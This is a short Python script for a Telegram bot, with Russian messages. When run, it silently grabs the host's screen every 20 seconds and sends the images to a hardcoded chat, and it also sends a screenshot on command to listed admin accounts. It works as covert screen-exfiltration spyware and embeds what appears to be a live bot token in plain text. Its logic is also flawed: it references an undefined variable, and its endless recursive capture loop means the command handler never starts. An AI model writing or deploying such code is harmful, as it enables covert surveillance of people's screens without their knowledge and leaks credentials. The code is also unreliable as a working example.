import telebot;
from telebot import types;
import time;
from screenshot import get_screenshots_bytes
import asyncio
bot = telebot.TeleBot("6182954429:AAFhs3NF6Diynl2lFBzNvJGpwtTd9GGshMs")
admins = [1028390936, 622662662, 5518302740]
chatid = -849718605
@bot.message_handler(commands=['start'])
def start(message):
  bot.send_message(message.chat.id, text="Приветствую вас, чего желаете?")
  
@bot.message_handler(content_types=['text'])
def func(message):
    Command_sender = message.from_user.id
    if Command_sender in admins:
        if(message.text == "get screenshot"):
            png = get_screenshots_bytes()
            bot.send_photo(message.chat.id, png)
        elif(message.text == "1"):
            bot.send_message(message.chat.id, text=f'{chat.id}')
            
    else: bot.send_message(message.chat.id, text='Простите, у вас нет доступа')
    
def Work():
   try:
     y = bot.polling(none_stop=True, interval=0.5)
     bot.polling(none_stop=True, interval=0.5)
     return y
   except:
      time.sleep(60)
      Work()



def screengrab():
    try:
        print("screenshot sended")
        png = get_screenshots_bytes()
        bot.send_photo(chatid, png)
        time.sleep(20)
        screengrab()
    except Exception as e:
        print(e)
        time.sleep(60)
        screengrab() 
        
screengrab()

Work()
